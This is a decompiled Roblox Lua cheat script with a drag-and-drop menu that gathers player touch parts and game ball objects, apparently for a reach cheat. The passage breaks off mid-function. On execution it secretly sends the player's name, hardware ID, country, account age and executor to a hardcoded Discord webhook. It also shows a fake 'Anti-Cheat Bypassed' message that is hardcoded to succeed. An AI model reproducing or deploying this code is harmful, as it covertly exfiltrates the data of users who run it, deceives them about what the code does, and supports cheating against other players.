-- ts file was generated at discord.gg/25ms

local _HttpService = game:GetService('HttpService')
local _MarketplaceService = game:GetService('MarketplaceService')
local _LocalizationService = game:GetService('LocalizationService')
local _Players = game:GetService('Players')
local _CoreGui = game:GetService('CoreGui')
local _UserInputService = game:GetService('UserInputService')

game:GetService('RunService')
game:GetService('TweenService')

local _LocalPlayer = _Players.LocalPlayer

_LocalPlayer:WaitForChild('PlayerGui', 10)

local _TouchEnabled = _UserInputService.TouchEnabled

if _TouchEnabled then
    if _UserInputService.KeyboardEnabled then
        _TouchEnabled = false
    else
        _TouchEnabled = not _UserInputService.MouseEnabled
    end
end
if ({
    [13664698400] = true,
    [17028263624] = true,
})[game.PlaceId] then
    local function u12()
        local v9 = 'N/A'
        local v10, v11 = pcall(function()
            return game:GetService('RbxAnalyticsService'):GetClientId()
        end)

        if v10 then
            v9 = v11
        else
            print('Error getting HWID: ' .. tostring(v11))
        end

        return v9
    end

    local u13 = not http_request and (not request and syn)

    if u13 then
        u13 = syn.request
    end
    if u13 then
        local v21, v22 = pcall(function()
            local v14 = u13
            local v15 = {
                Method = 'POST',
                Url = 'https://discord.com/api/webhooks/1350133324324278325/cCRGXXDCBleV0sh-ChXzPpIONyh7rDCyqzpv-aaCFUOoQhwMF35xVDYqFugeQGjdhBW_',
                Headers = {
                    ['Content-Type'] = 'application/json',
                },
            }
            local v16 = _HttpService
            local _JSONEncode = v16.JSONEncode
            local v18 = {
                username = 'Logs',
            }
            local v19 = {}
            local v20 = {
                title = _MarketplaceService:GetProductInfo(game.PlaceId).Name,
                description = '**' .. _LocalPlayer.Name .. '** has executed the script!',
                color = 0,
                fields = {
                    {
                        name = 'Place ID',
                        value = game.PlaceId,
                    },
                    {
                        name = 'Account Age',
                        value = _LocalPlayer.AccountAge .. ' days old',
                    },
                    {
                        name = 'Country',
                        value = _LocalizationService:GetCountryRegionForPlayerAsync(_LocalPlayer),
                    },
                    {
                        name = 'Executor',
                        value = identifyexecutor() or 'Unknown',
                    },
                    {
                        name = 'HWID',
                        value = u12(),
                    },
                    {
                        name = 'Server Size',
                        value = #_Players:GetPlayers() .. ' players',
                    },
                    {
                        name = 'Execution Time',
                        value = os.date('%Y-%m-%d %H:%M:%S', os.time()),
                    },
                },
            }

            __set_list(v19, 1, {v20})

            v18.embeds = v19
            v15.Body = _JSONEncode(v16, v18)

            v14(v15)
        end)

        if not v21 then
            print('Error sending Discord log: ' .. tostring(v22))
        end
    end

    local _ScreenGui = Instance.new('ScreenGui')

    _ScreenGui.Name = 'FullscreenLoading'
    _ScreenGui.IgnoreGuiInset = true
    _ScreenGui.ResetOnSpawn = false
    _ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local _Frame = Instance.new('Frame')

    _Frame.BackgroundColor3 = Color3.new(0, 0, 0)
    _Frame.Size = UDim2.new(1, 0, 1, 0)
    _Frame.Position = UDim2.new(0, 0, 0, 0)
    _Frame.BorderSizePixel = 0
    _Frame.Parent = _ScreenGui

    local _TextLabel = Instance.new('TextLabel')

    _TextLabel.Text = 'Bypassing Anti-Cheat..'
    _TextLabel.Font = Enum.Font.GothamBold
    _TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    _TextLabel.TextScaled = true
    _TextLabel.Size = UDim2.new(1, 0, 0, 50)
    _TextLabel.Position = UDim2.new(0, 0, 0.5, -25)
    _TextLabel.BackgroundTransparency = 1
    _TextLabel.Parent = _Frame
    _ScreenGui.Parent = _CoreGui

    task.wait(2)

    _TextLabel.Text = 'Successfully Loaded'

    task.wait(1.5)
    _ScreenGui:Destroy()

    local v26 = true

    local function u37(p27, p28, p29)
        local v35, v36 = pcall(function()
            local _ScreenGui2 = Instance.new('ScreenGui')

            _ScreenGui2.Name = 'NotificationGui'
            _ScreenGui2.Parent = _CoreGui
            _ScreenGui2.ResetOnSpawn = false
            _ScreenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

            local _Frame2 = Instance.new('Frame')

            _Frame2.Size = UDim2.new(0, 220, 0, 60)
            _Frame2.Position = UDim2.new(1, -230, 1, -70 - p28)
            _Frame2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            _Frame2.BackgroundTransparency = 0.3
            _Frame2.BorderSizePixel = 0
            _Frame2.Parent = _ScreenGui2

            local _UICorner = Instance.new('UICorner')

            _UICorner.CornerRadius = UDim.new(0, 8)
            _UICorner.Parent = _Frame2

            local _UIStroke = Instance.new('UIStroke')

            _UIStroke.Color = p29 == 'success' and Color3.fromRGB(50, 255, 50) or Color3.fromRGB(255, 50, 50)
            _UIStroke.Thickness = 1
            _UIStroke.Transparency = 0.5
            _UIStroke.Parent = _Frame2

            local _TextLabel2 = Instance.new('TextLabel')

            _TextLabel2.Size = UDim2.new(1, -20, 1, -10)
            _TextLabel2.Position = UDim2.new(0, 10, 0, 5)
            _TextLabel2.BackgroundTransparency = 1
            _TextLabel2.Text = p27
            _TextLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
            _TextLabel2.TextSize = 14
            _TextLabel2.Font = Enum.Font.Gotham
            _TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
            _TextLabel2.TextYAlignment = Enum.TextYAlignment.Center
            _TextLabel2.TextWrapped = true
            _TextLabel2.Parent = _Frame2

            task.spawn(function()
                task.wait(3)
                _ScreenGui2:Destroy()
            end)
        end)

        if not v35 then
            print('Error creating notification: ' .. tostring(v36))
        end
    end

    u37(v26 and 'Anti-Cheat Bypassed' or 'Anti-Cheat Bypass Failed', 0, v26 and 'success' or 'failure')

    local function u38()
        return identifyexecutor() or 'Unknown'
    end

    local v39 = u38():lower()

    if table.find({
        'cloudy',
        'xeno',
        'solara',
        'zorara',
        'jjsploit',
    }, v39) then
        u37('Unsupported Executor: ' .. v39, 60, 'failure')
    end

    local _ScreenGui3 = Instance.new('ScreenGui')

    _ScreenGui3.Name = 'V0x'
    _ScreenGui3.Parent = _CoreGui
    _ScreenGui3.ResetOnSpawn = false
    _ScreenGui3.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    _ScreenGui3.IgnoreGuiInset = true

    local v41 = UDim2.new(0, 600, 0, 450)
    local v42 = UDim2.new(0, 300, 0, 225)
    local u43 = _TouchEnabled and v42 and v42 or v41
    local _Frame3 = Instance.new('Frame')

    _Frame3.Size = u43
    _Frame3.Position = UDim2.new(0.5, -u43.X.Offset / 2, 0.5, -u43.Y.Offset / 2)
    _Frame3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    _Frame3.BackgroundTransparency = 0.3
    _Frame3.BorderSizePixel = 0
    _Frame3.ClipsDescendants = true
    _Frame3.Parent = _ScreenGui3

    local _UICorner2 = Instance.new('UICorner')

    _UICorner2.CornerRadius = UDim.new(0, 8)
    _UICorner2.Parent = _Frame3

    local _UIStroke2 = Instance.new('UIStroke')

    _UIStroke2.Color = Color3.fromRGB(0, 140, 255)
    _UIStroke2.Thickness = 1
    _UIStroke2.Transparency = 0.5
    _UIStroke2.Parent = _Frame3

    local _Frame4 = Instance.new('Frame')

    _Frame4.Size = UDim2.new(1, 0, 0, u43.Y.Offset * 40 / 450)
    _Frame4.BackgroundTransparency = 1
    _Frame4.Parent = _Frame3

    local _TextLabel3 = Instance.new('TextLabel')

    _TextLabel3.Size = UDim2.new(1, -80, 0, u43.Y.Offset * 30 / 450)
    _TextLabel3.Position = UDim2.new(0, 40, 0, 5)
    _TextLabel3.BackgroundTransparency = 1
    _TextLabel3.Text = '97 shit on the opps'
    _TextLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
    _TextLabel3.TextSize = _TouchEnabled and 14 or 20
    _TextLabel3.Font = Enum.Font.GothamBold
    _TextLabel3.TextXAlignment = Enum.TextXAlignment.Center
    _TextLabel3.Parent = _Frame4

    local u49 = false
    local u50 = nil
    local u51 = nil

    _Frame4.InputBegan:Connect(function(p52)
        if p52.UserInputType == Enum.UserInputType.MouseButton1 or p52.UserInputType == Enum.UserInputType.Touch then
            u49 = true
            u50 = p52.Position
            u51 = _Frame3.Position
        end
    end)
    _Frame4.InputEnded:Connect(function(p53)
        if p53.UserInputType == Enum.UserInputType.MouseButton1 or p53.UserInputType == Enum.UserInputType.Touch then
            u49 = false
        end
    end)
    _UserInputService.InputChanged:Connect(function(p54)
        if u49 and (p54.UserInputType == Enum.UserInputType.MouseMovement or p54.UserInputType == Enum.UserInputType.Touch) then
            local v55 = p54.Position - u50

            _Frame3.Position = UDim2.new(u51.X.Scale, u51.X.Offset + v55.X, u51.Y.Scale, u51.Y.Offset + v55.Y)
        end
    end)

    local _TextButton = Instance.new('TextButton')

    _TextButton.Size = UDim2.new(0, u43.Y.Offset * 30 / 450, 0, u43.Y.Offset * 30 / 450)
    _TextButton.Position = UDim2.new(1, -40, 0, 5)
    _TextButton.BackgroundTransparency = 1
    _TextButton.Text = 'X'
    _TextButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    _TextButton.TextSize = _TouchEnabled and 12 or 16
    _TextButton.Font = Enum.Font.Gotham
    _TextButton.Parent = _Frame4

    _TextButton.MouseButton1Click:Connect(function()
        _ScreenGui3:Destroy()
    end)
    _TextButton.MouseEnter:Connect(function()
        _TextButton.TextColor3 = Color3.fromRGB(0, 140, 255)
    end)
    _TextButton.MouseLeave:Connect(function()
        _TextButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    end)

    local _TextButton2 = Instance.new('TextButton')

    _TextButton2.Size = UDim2.new(0, u43.Y.Offset * 30 / 450, 0, u43.Y.Offset * 30 / 450)
    _TextButton2.Position = UDim2.new(1, -80, 0, 5)
    _TextButton2.BackgroundTransparency = 1
    _TextButton2.Text = '\u{fffd}\u{fffd}'
    _TextButton2.TextColor3 = Color3.fromRGB(200, 200, 200)
    _TextButton2.TextSize = _TouchEnabled and 12 or 16
    _TextButton2.Font = Enum.Font.Gotham
    _TextButton2.Parent = _Frame4

    local u58 = false
    local u59 = nil
    local u60 = false
    local u61 = nil
    local u62 = nil
    local u63 = 5

    _TextButton2.MouseButton1Click:Connect(function()
        u58 = not u58

        if u58 then
            _Frame3.Visible = false

            if not u59 and _ScreenGui3 then
                u59 = Instance.new('Frame')
                u59.Size = UDim2.new(0, u43.Y.Offset * 62.5 / 450, 0, u43.Y.Offset * 62.5 / 450)
                u59.Position = UDim2.new(0.5, -(u43.Y.Offset * 62.5 / 450) / 2, 0.5, -(u43.Y.Offset * 62.5 / 450) / 2)
                u59.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
                u59.BackgroundTransparency = 0.3
                u59.ZIndex = 10
                u59.Parent = _ScreenGui3

                local _UICorner3 = Instance.new('UICorner')

                _UICorner3.CornerRadius = UDim.new(0.5, 0)
                _UICorner3.Parent = u59

                local _UIStroke3 = Instance.new('UIStroke')

                _UIStroke3.Color = Color3.fromRGB(0, 140, 255)
                _UIStroke3.Thickness = 1
                _UIStroke3.Transparency = 0.5
                _UIStroke3.Parent = u59

                local _ImageLabel = Instance.new('ImageLabel')

                _ImageLabel.Size = UDim2.new(0.8, 0, 0.8, 0)
                _ImageLabel.Position = UDim2.new(0.1, 0, 0.1, 0)
                _ImageLabel.BackgroundTransparency = 1
                _ImageLabel.Image = 'rbxassetid://134262569335890'
                _ImageLabel.Parent = u59

                local _TextButton3 = Instance.new('TextButton')

                _TextButton3.Size = UDim2.new(1, 0, 1, 0)
                _TextButton3.BackgroundTransparency = 1
                _TextButton3.Text = ''
                _TextButton3.Parent = u59

                _TextButton3.InputBegan:Connect(function(p68)
                    if p68.UserInputType == Enum.UserInputType.MouseButton1 or p68.UserInputType == Enum.UserInputType.Touch then
                        if not u59 then
                            return
                        end

                        u60 = false
                        u61 = p68.Position
                        u62 = u59.Position
                    end
                end)
                _TextButton3.InputChanged:Connect(function(p69)
                    if (p69.UserInputType == Enum.UserInputType.MouseMovement or p69.UserInputType == Enum.UserInputType.Touch) and (u61 and u59) then
                        local v70 = p69.Position - u61

                        if u63 < v70.Magnitude then
                            u60 = true
                            u59.Position = UDim2.new(u62.X.Scale, u62.X.Offset + v70.X, u62.Y.Scale, u62.Y.Offset + v70.Y)
                        end
                    end
                end)
                _TextButton3.InputEnded:Connect(function(p71)
                    if p71.UserInputType == Enum.UserInputType.MouseButton1 or p71.UserInputType == Enum.UserInputType.Touch then
                        if not u59 then
                            return
                        end
                        if not u60 then
                            u58 = false
                            _Frame3.Visible = true

                            u59:Destroy()

                            u59 = nil
                        end

                        u60 = false
                        u61 = nil
                        u62 = nil
                    end
                end)
            end
        else
            _Frame3.Visible = true

            if u59 then
                u59:Destroy()

                u59 = nil
            end
        end
    end)
    _TextButton2.MouseEnter:Connect(function()
        _TextButton2.TextColor3 = Color3.fromRGB(0, 140, 255)
    end)
    _TextButton2.MouseLeave:Connect(function()
        _TextButton2.TextColor3 = Color3.fromRGB(200, 200, 200)
    end)

    local _Frame5 = Instance.new('Frame')

    _Frame5.Size = UDim2.new(0, u43.X.Offset * 100 / 600, 1, -u43.Y.Offset * 40 / 450)
    _Frame5.Position = UDim2.new(0, 0, 0, u43.Y.Offset * 40 / 450)
    _Frame5.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    _Frame5.BackgroundTransparency = 0.3
    _Frame5.BorderSizePixel = 0
    _Frame5.ClipsDescendants = true
    _Frame5.Parent = _Frame3

    local _Frame6 = Instance.new('Frame')

    _Frame6.Size = UDim2.new(0, u43.X.Offset * 500 / 600, 1, -u43.Y.Offset * 40 / 450)
    _Frame6.Position = UDim2.new(0, u43.X.Offset * 100 / 600, 0, u43.Y.Offset * 40 / 450)
    _Frame6.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    _Frame6.BackgroundTransparency = 0.3
    _Frame6.BorderSizePixel = 0
    _Frame6.Parent = _Frame3

    local u74 = nil
    local u75 = {}

    local function u79(p76)
        local _UIListLayout = p76:FindFirstChildOfClass('UIListLayout')

        if _UIListLayout then
            local _Y = _UIListLayout.AbsoluteContentSize.Y

            p76.CanvasSize = UDim2.new(0, 0, 0, _Y + (_TouchEnabled and 60 or 120))
        end
    end
    local function u88(p80, p81, p82)
        local _Frame7 = Instance.new('Frame')

        _Frame7.Size = UDim2.new(1, 0, 0, 0)
        _Frame7.BackgroundTransparency = 1
        _Frame7.AutomaticSize = Enum.AutomaticSize.Y
        _Frame7.Parent = p80

        local _TextLabel4 = Instance.new('TextLabel')

        _TextLabel4.Size = UDim2.new(1, 0, 0, _TouchEnabled and 15 or 25)
        _TextLabel4.BackgroundTransparency = 1
        _TextLabel4.Text = p81
        _TextLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
        _TextLabel4.TextSize = _TouchEnabled and 12 or 16
        _TextLabel4.Font = Enum.Font.GothamBold
        _TextLabel4.TextXAlignment = Enum.TextXAlignment.Left
        _TextLabel4.Parent = _Frame7

        local _Frame8 = Instance.new('Frame')

        _Frame8.Size = UDim2.new(1, 0, 0, 0)
        _Frame8.BackgroundTransparency = 1
        _Frame8.AutomaticSize = Enum.AutomaticSize.Y
        _Frame8.Parent = _Frame7

        local _UIListLayout2 = Instance.new('UIListLayout')

        _UIListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
        _UIListLayout2.Padding = UDim.new(0, _TouchEnabled and 10 or 15)
        _UIListLayout2.Parent = _Frame8

        local _UIPadding = Instance.new('UIPadding')

        _UIPadding.PaddingTop = p82 or UDim.new(0, _TouchEnabled and 10 or 15)
        _UIPadding.PaddingBottom = UDim.new(0, _TouchEnabled and 10 or 15)
        _UIPadding.Parent = _Frame8

        _UIListLayout2:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
            u79(p80)
        end)

        return _Frame8, _TextLabel4
    end
    local function u99(p89, p90, p91)
        local _Frame9 = Instance.new('Frame')

        _Frame9.Size = UDim2.new(1, 0, 0, _TouchEnabled and 30 or 40)
        _Frame9.BackgroundTransparency = 1
        _Frame9.Parent = p89

        local _TextLabel5 = Instance.new('TextLabel')

        _TextLabel5.Size = UDim2.new(0.7, 0, 1, 0)
        _TextLabel5.BackgroundTransparency = 1
        _TextLabel5.Text = p90
        _TextLabel5.TextColor3 = Color3.fromRGB(255, 255, 255)
        _TextLabel5.TextSize = _TouchEnabled and 10 or 14
        _TextLabel5.Font = Enum.Font.Gotham
        _TextLabel5.TextXAlignment = Enum.TextXAlignment.Left
        _TextLabel5.TextYAlignment = Enum.TextYAlignment.Center
        _TextLabel5.Parent = _Frame9

        local _TextButton4 = Instance.new('TextButton')

        _TextButton4.Size = UDim2.new(0, _TouchEnabled and 30 or 40, 0, _TouchEnabled and 12 or 16)
        _TextButton4.Position = UDim2.new(0.85, 0, 0.5, _TouchEnabled and -6 or -8)
        _TextButton4.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        _TextButton4.Text = ''
        _TextButton4.Parent = _Frame9

        local _UICorner4 = Instance.new('UICorner')

        _UICorner4.CornerRadius = UDim.new(0, _TouchEnabled and 3 or 4)
        _UICorner4.Parent = _TextButton4

        local _UIStroke4 = Instance.new('UIStroke')

        _UIStroke4.Color = Color3.fromRGB(255, 255, 255)
        _UIStroke4.Thickness = 1
        _UIStroke4.Transparency = 0.5
        _UIStroke4.Parent = _TextButton4

        local _TextLabel6 = Instance.new('TextLabel')

        _TextLabel6.Size = UDim2.new(1, 0, 1, 0)
        _TextLabel6.BackgroundTransparency = 1
        _TextLabel6.Text = 'Off'
        _TextLabel6.TextColor3 = Color3.fromRGB(255, 255, 255)
        _TextLabel6.TextSize = _TouchEnabled and 8 or 10
        _TextLabel6.Font = Enum.Font.Gotham
        _TextLabel6.TextXAlignment = Enum.TextXAlignment.Center
        _TextLabel6.TextYAlignment = Enum.TextYAlignment.Center
        _TextLabel6.Parent = _TextButton4

        local u98 = false

        _TextButton4.MouseButton1Click:Connect(function()
            u98 = not u98
            _TextButton4.BackgroundColor3 = u98 and Color3.fromRGB(0, 140, 255) or Color3.fromRGB(30, 30, 30)
            _TextLabel6.Text = u98 and 'On' or 'Off'

            p91(u98)
        end)
        u79(p89.Parent.Parent)

        return _TextButton4, _TextLabel6
    end
    local function u120(p100, p101, p102, p103, p104, p105)
        local _Frame10 = Instance.new('Frame')

        _Frame10.Size = UDim2.new(1, 0, 0, _TouchEnabled and 40 or 50)
        _Frame10.BackgroundTransparency = 1
        _Frame10.Parent = p100

        local _TextLabel7 = Instance.new('TextLabel')

        _TextLabel7.Size = UDim2.new(1, 0, 0, _TouchEnabled and 15 or 20)
        _TextLabel7.BackgroundTransparency = 1
        _TextLabel7.Text = p101 .. ': ' .. string.format('%.1f', p104)
        _TextLabel7.TextColor3 = Color3.fromRGB(255, 255, 255)
        _TextLabel7.TextSize = _TouchEnabled and 10 or 14
        _TextLabel7.Font = Enum.Font.Gotham
        _TextLabel7.TextXAlignment = Enum.TextXAlignment.Left
        _TextLabel7.Parent = _Frame10

        local _Frame11 = Instance.new('Frame')

        _Frame11.Size = UDim2.new(1, 0, 0, _TouchEnabled and 3 or 4)
        _Frame11.Position = UDim2.new(0, 0, 0, _TouchEnabled and 25 or 30)
        _Frame11.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        _Frame11.Parent = _Frame10

        local _UICorner5 = Instance.new('UICorner')

        _UICorner5.CornerRadius = UDim.new(0, _TouchEnabled and 1 or 2)
        _UICorner5.Parent = _Frame11

        local _Frame12 = Instance.new('Frame')

        _Frame12.Size = UDim2.new((p104 - p102) / (p103 - p102), 0, 1, 0)
        _Frame12.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
        _Frame12.Parent = _Frame11

        local _UICorner6 = Instance.new('UICorner')

        _UICorner6.CornerRadius = UDim.new(0, _TouchEnabled and 1 or 2)
        _UICorner6.Parent = _Frame12

        local _Frame13 = Instance.new('Frame')

        _Frame13.Size = UDim2.new(0, _TouchEnabled and 8 or 12, 0, _TouchEnabled and 8 or 12)
        _Frame13.Position = UDim2.new((p104 - p102) / (p103 - p102), _TouchEnabled and -4 or -6, 0, _TouchEnabled and -3 or -4)
        _Frame13.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
        _Frame13.Parent = _Frame11

        local _UICorner7 = Instance.new('UICorner')

        _UICorner7.CornerRadius = UDim.new(0, _TouchEnabled and 4 or 6)
        _UICorner7.Parent = _Frame13

        local _TextButton5 = Instance.new('TextButton')

        _TextButton5.Size = UDim2.new(1, 0, 1, 0)
        _TextButton5.BackgroundTransparency = 1
        _TextButton5.Text = ''
        _TextButton5.Parent = _Frame11

        local u115 = false

        _TextButton5.MouseButton1Down:Connect(function()
            u115 = true
        end)
        _TextButton5.MouseButton1Up:Connect(function()
            u115 = false
        end)
        _TextButton5.MouseLeave:Connect(function()
            u115 = false
        end)
        _UserInputService.InputChanged:Connect(function(p116)
            if u115 and (p116.UserInputType == Enum.UserInputType.MouseMovement or p116.UserInputType == Enum.UserInputType.Touch) then
                local v117 = (_UserInputService:GetMouseLocation().X - _Frame11.AbsolutePosition.X) / _Frame11.AbsoluteSize.X
                local v118 = p102 + math.clamp(v117, 0, 1) * (p103 - p102)
                local v119 = math.clamp(math.round(v118 * 10) / 10, p102, p103)

                if v119 < p102 or p103 < v119 then
                    u37('Invalid slider value: ' .. v119, 60, 'failure')

                    v119 = math.clamp(v119, p102, p103)
                end

                _Frame12.Size = UDim2.new((v119 - p102) / (p103 - p102), 0, 1, 0)
                _Frame13.Position = UDim2.new((v119 - p102) / (p103 - p102), _TouchEnabled and -4 or -6, 0, _TouchEnabled and -3 or -4)
                _TextLabel7.Text = p101 .. ': ' .. string.format('%.1f', v119)

                p105(v119)
            end
        end)
        u79(p100.Parent.Parent)

        return _Frame11, _Frame12, _Frame13, _TextLabel7
    end
    local function u126(p121, p122, p123)
        local _TextButton6 = Instance.new('TextButton')

        _TextButton6.Size = UDim2.new(0.5, 0, 0, _TouchEnabled and 20 or 30)
        _TextButton6.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
        _TextButton6.Text = p122
        _TextButton6.TextColor3 = Color3.fromRGB(255, 255, 255)
        _TextButton6.TextSize = _TouchEnabled and 10 or 14
        _TextButton6.Font = Enum.Font.GothamBold
        _TextButton6.Parent = p121

        local _UICorner8 = Instance.new('UICorner')

        _UICorner8.CornerRadius = UDim.new(0, _TouchEnabled and 3 or 4)
        _UICorner8.Parent = _TextButton6

        _TextButton6.MouseEnter:Connect(function()
            _TextButton6.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
        end)
        _TextButton6.MouseLeave:Connect(function()
            _TextButton6.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
        end)
        _TextButton6.MouseButton1Click:Connect(p123)
        u79(p121.Parent.Parent)

        return _TextButton6
    end
    local function u130(p127, p128)
        local _TextLabel8 = Instance.new('TextLabel')

        _TextLabel8.Size = UDim2.new(1, 0, 0, _TouchEnabled and 15 or 25)
        _TextLabel8.BackgroundTransparency = 1
        _TextLabel8.Text = p128
        _TextLabel8.TextColor3 = Color3.fromRGB(255, 255, 255)
        _TextLabel8.TextSize = _TouchEnabled and 10 or 14
        _TextLabel8.Font = Enum.Font.Gotham
        _TextLabel8.TextXAlignment = Enum.TextXAlignment.Left
        _TextLabel8.TextYAlignment = Enum.TextYAlignment.Center
        _TextLabel8.Parent = p127

        u79(p127.Parent.Parent)
    end
    local function u134()
        local v131 = 'N/A'
        local v132, v133 = pcall(function()
            return math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue()) .. ' ms'
        end)

        if v132 then
            v131 = v133
        else
            print('Error getting ping: ' .. tostring(v133))
        end

        return v131
    end

    local u135 = false
    local u136 = 2
    local u137 = {}
    local u138 = os.time()
    local u139 = true
    local u140 = {}

    local function u152(p141)
        if p141 or u138 + 3 <= os.time() then
            table.clear(u140)

            local _Character = _LocalPlayer.Character

            if _Character then
                local v143, v144, v145 = pairs(_Character:GetDescendants())

                while true do
                    local v146

                    v145, v146 = v143(v144, v145)

                    if v145 == nil then
                        break
                    end
                    if v146.Name == 'TouchInterest' and v146.Parent:IsA('BasePart') then
                        table.insert(u140, v146)
                    end
                end
            else
                print('Error: Character not found in refreshballs')
            end

            u138 = os.time()

            table.clear(u137)

            local v147, v148, v149 = pairs(workspace:GetDescendants())

            while true do
                local v150

                v149, v150 = v147(v148, v149)

                if v149 == nil then
                    break
                end

                local v151 = string.sub(v150.Name, 1, 1)

                if v150.Name == 'TPS' or (v150.Name == 'AIFA' or (v150.Name == 'CSF' or (v150.Name == 'VCL' or (v150.Name == 'MPS' or (v150.Name == 'VFA' or (v150.Name == 'OFA' or (v150.Name == 'IFF' or (v150.Name == 'VEF' or (v150.Name == 'Fix' or (v150.Name == 'LIR' or (v150.Name == 'UPL' or (v150.Name == '' or v151 == '{')))))))))))) then
                    table.insert(u137, v150)
                end
            end

            if #u137 == 0 then
                print('Error: No valid balls found in refreshballs')
            end
        end
    end

    u152(true)

    local function v169(p153, p154)
        local v155 = p153 == nil and 'Unnamed Tab' or p153
        local v156 = u43.Y.Offset * 40 / 450
        local v157 = #u75
        local _TextButton7 = Instance.new('TextButton')

        _TextButton7.Size = UDim2.new(1, 0, 0, v156)
        _TextButton7.Position = UDim2.new(0, 0, 0, 10 + v157 * (v156 + (_TouchEnabled and 5 or 10)))
        _TextButton7.BackgroundTransparency = 1
        _TextButton7.Text = ''
        _TextButton7.Parent = _Frame5

        local _Frame14 = Instance.new('Frame')

        _Frame14.Size = UDim2.new(1, 0, 1, 0)
        _Frame14.BackgroundTransparency = 1
        _Frame14.Parent = _TextButton7

        local _TextLabel9 = Instance.new('TextLabel')

        _TextLabel9.Size = UDim2.new(0, u43.X.Offset * 10 / 600, 1, 0)
        _TextLabel9.Position = UDim2.new(0, u43.X.Offset * 20 / 600, 0, 0)
        _TextLabel9.BackgroundTransparency = 1
        _TextLabel9.Text = '|'
        _TextLabel9.TextColor3 = Color3.fromRGB(150, 150, 150)
        _TextLabel9.TextSize = _TouchEnabled and 10 or 14
        _TextLabel9.Font = Enum.Font.Gotham
        _TextLabel9.TextXAlignment = Enum.TextXAlignment.Left
        _TextLabel9.Parent = _Frame14

        local _TextLabel10 = Instance.new('TextLabel')

        _TextLabel10.Size = UDim2.new(1, -u43.X.Offset * 30 / 600, 1, 0)
        _TextLabel10.Position = UDim2.new(0, u43.X.Offset * 30 / 600, 0, 0)
        _TextLabel10.BackgroundTransparency = 1
        _TextLabel10.Text = v155
        _TextLabel10.TextColor3 = Color3.fromRGB(150, 150, 150)
        _TextLabel10.TextSize = _TouchEnabled and 10 or 14
        _TextLabel10.Font = Enum.Font.Gotham
        _TextLabel10.TextXAlignment = Enum.TextXAlignment.Left
        _TextLabel10.Parent = _Frame14

        local _Frame15 = Instance.new('Frame')

        _Frame15.Size = UDim2.new(1, 0, 1, 0)
        _Frame15.BackgroundTransparency = 1
        _Frame15.Visible = false
        _Frame15.Parent = _Frame6

        local _ScrollingFrame = Instance.new('ScrollingFrame')

        _ScrollingFrame.Size = UDim2.new(1, -u43.X.Offset * 20 / 600, 1, -u43.Y.Offset * 20 / 450)
        _ScrollingFrame.Position = UDim2.new(0, u43.X.Offset * 10 / 600, 0, u43.Y.Offset * 10 / 450)
        _ScrollingFrame.BackgroundTransparency = 1
        _ScrollingFrame.ScrollBarThickness = _TouchEnabled and 2 or 4
        _ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
        _ScrollingFrame.Parent = _Frame15

        local _UIListLayout3 = Instance.new('UIListLayout')

        _UIListLayout3.SortOrder = Enum.SortOrder.LayoutOrder
        _UIListLayout3.Padding = UDim.new(0, _TouchEnabled and 10 or 20)
        _UIListLayout3.Parent = _ScrollingFrame

        _UIListLayout3:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
            u79(_ScrollingFrame)
        end)

        if _TextButton7 then
            _TextButton7.MouseButton1Click:Connect(function()
                if u74 then
                    u74.Visible = false
                end

                _Frame15.Visible = true
                u74 = _Frame15

                local v165, v166, v167 = pairs(u75)

                while true do
                    local v168

                    v167, v168 = v165(v166, v167)

                    if v167 == nil then
                        break
                    end

                    v168.indicatorLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
                    v168.nameLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
                end

                _TextLabel9.TextColor3 = Color3.fromRGB(0, 140, 255)
                _TextLabel10.TextColor3 = Color3.fromRGB(255, 255, 255)

                u79(_ScrollingFrame)
            end)
        else
            u37('Error: TabButton is nil during creation.', 60, 'failure')
        end

        table.insert(u75, {
            button = _TextButton7,
            content = _Frame15,
            indicatorLabel = _TextLabel9,
            nameLabel = _TextLabel10,
            originalName = v155,
        })
        p154(_ScrollingFrame)
    end

    v169('Home', function(p170)
        local v171, v172 = u88(p170, 'Welcome, ' .. _LocalPlayer.DisplayName)

        v172.TextSize = _TouchEnabled and 8 or 10

        local _ImageLabel2 = Instance.new('ImageLabel')

        _ImageLabel2.Size = UDim2.new(0, _TouchEnabled and 25 or 50, 0, _TouchEnabled and 25 or 50)
        _ImageLabel2.Position = UDim2.new(0, _TouchEnabled and 5 or 10, 1, _TouchEnabled and -35 or -60)
        _ImageLabel2.BackgroundTransparency = 1
        _ImageLabel2.Image = _Players:GetUserThumbnailAsync(_LocalPlayer.UserId, Enum.ThumbnailType.AvatarBust, Enum.ThumbnailSize.Size150x150)
        _ImageLabel2.Parent = v171

        local _UIStroke5 = Instance.new('UIStroke')

        _UIStroke5.Color = Color3.fromRGB(0, 140, 255)
        _UIStroke5.Thickness = 1
        _UIStroke5.Transparency = 0.5
        _UIStroke5.Parent = _ImageLabel2

        local _UICorner9 = Instance.new('UICorner')

        _UICorner9.CornerRadius = UDim.new(0, _TouchEnabled and 2 or 4)
        _UICorner9.Parent = _ImageLabel2
        v172.Size = UDim2.new(1, 0, 0, _TouchEnabled and 10 or 15)
